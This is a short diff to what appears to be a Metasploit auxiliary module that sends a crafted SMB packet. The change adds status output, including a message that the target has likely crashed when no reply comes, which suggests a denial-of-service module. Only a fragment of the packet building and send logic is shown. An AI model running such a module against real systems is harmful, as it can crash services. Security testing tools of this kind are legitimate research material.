@@ -58,8 +58,16 @@ class Metasploit3 < Msf::Auxiliary
 		pkt['Payload']['SMB'].v['ProcessID']     = 0
 		pkt['Payload']['SMB'].v['MultiplexID']   = rand(0x10000)
 
+		print_status("Sending request and waiting for a reply...")
 		sock.put(pkt.to_s)
-		p sock.get_once
+		r = sock.get_once
+		
+		if(not r)
+			print_status("The target system has likely crashed")
+		else
+			print_status("Response received: #{r.inspect}")
+		end
+		
 		disconnect()
 	end
 
